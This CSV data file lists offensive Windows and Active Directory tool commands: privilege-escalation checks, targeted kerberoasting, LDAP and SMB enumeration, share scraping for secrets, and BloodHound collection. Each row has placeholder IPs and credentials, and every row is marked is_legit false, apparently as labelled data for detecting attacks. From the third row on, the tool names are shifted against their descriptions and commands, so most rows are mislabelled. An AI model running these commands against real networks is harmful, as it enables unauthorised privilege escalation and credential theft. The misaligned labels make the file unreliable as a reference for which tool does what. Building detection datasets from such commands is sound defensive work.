"Name","description","command","items","OS","attack_types","references","services","is_legit"
"winPEAS","winpeas.exe is a script that will search for all possible paths to escalate privileges on Windows hosts. The below command will run all priv esc checks and store the output in a file.  Command Reference:  	Run all checks: cmd  	Output File: output.txt","winpeas.exe cmd > output.txt","Shell","Windows","PrivEsc","[''https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS''-|-''https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md''-|-''https://book.hacktricks.xyz/windows/windows-local-privilege-escalation'']","","false"
"targetedKerberoast","targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print ""kerberoast"" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the ""kerberoast"" hash, and delete the temporary SPN set for that operation.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1","[''Password''-|-''Username'']","Linux","Exploitation","https://github.com/ShutdownRepo/targetedKerberoast","[''Kerberos''-|-''NTLM'']","false"
"lsassy-credsdump","enum4linux-ng is a modern reimplementation of enum4linux written in Python3. It is used to enumerate information from Windows and Samba systems, providing cleaner output and better support for modern protocols. The following command performs a full unauthenticated enumeration of the target.  Command Reference:  	Target IP: 10.10.10.1","enum4linux-ng 10.10.10.1","No_Creds","Linux","Enumeration","https://github.com/cddmp/enum4linux-ng","SMB","false"
"enum4linux-ng","windapsearch enumerates users, groups, and computers from a Windows domain through LDAP queries. The following command enumerates all 3 of the above mentioned using provided credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Enum Users: -U  	Enum Groups: -G  	Enum Domain Admins: --da  	Enum members of group: -m ""Remote Desktop Users""  	Enum Computers and resolve DNS: -C -r","python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m ""Remote Desktop Users"" -C -r","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ropnop/windapsearch''-|-''https://www.attackdebris.com/?p=470'']","","false"
"bloodyAD-Wite-Properties","Snaffler is a tool used to enumerate sensitive data (passwords, PII, etc.) from file shares in Active Directory. It searches for interesting files based on file extensions, file names, and file content that's matched against regex. It's also highly configurable, allowing you to add your own regex searches. The following command will enumerate all machines in the domain and search for accessible file shares, checking for interesting files that might have sensitive data.  Command Reference:  	Domain: test.local  	Domain Controller: 10.10.10.1","Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1","Shell","Windows","Enumeration","https://github.com/SnaffCon/Snaffler","SMB","false"
"Windapsearch","SharpWMI.exe is part of the GhostPack suite of tools that provides WMI functionality, such as local/remote WMI queries, remote WMI process creation, and remote execution of arbitrary VBS through WMI events. The following command will simply list all processes running on the local system.  Command Reference:  	Get all processes: ""select * from win32_process""","SharpWMI.exe action=query query=""select * from win32_process""","Shell","Windows","Persistence","[''https://github.com/GhostPack/SharpWMI''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","WMI","false"
"Snaffler","SharpUp.exe is part of the GhostPack suite of tools and is a C# port of PowerUp that will perform numerous privilege escalation checks. The following command will run all priv esc checks and store the output in a file.  Command Reference:  	Output File: output.txt","SharpUp.exe > output.txt","Shell","Windows","PrivEsc","[''https://github.com/GhostPack/SharpUp''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpWMI","SharpLDAPmonitor.exe allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:TEST.local\john /pass:password123","[''Password''-|-''Username'']","Windows","Enumeration","https://github.com/p0dalirius/LDAPmonitor/tree/master/csharp","[''LDAP''-|-''Kerberos''-|-''NTLM'']","false"
"SharpUp","SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and stores the output in a zip file that can be directly placed in the BloodHound GUI.  Command Reference:  	Output File: output.zip","SharpHound.exe --CollectionMethods All --ZipFileName output.zip","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/BloodHoundAD/SharpHound3''-|-''https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html'']","","false"
"SharpLDAPmonitor","SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and will use the provided LDAP credentials when performing LDAP collection methods, and stores the output in a zip file that can be directly placed in the BloodHound GUI.  Command Reference:  	LDAP Username: john  	LDAP Password: password123  	Output File: output.zip","SharpHound.exe --CollectionMethod All --LdapUsername john --LdapPassword password123 --ZipFileName output.zip","[''Shell''-|-''Username''-|-''Password'']","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/BloodHoundAD/SharpHound3''-|-''https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html'']","LDAP","false"
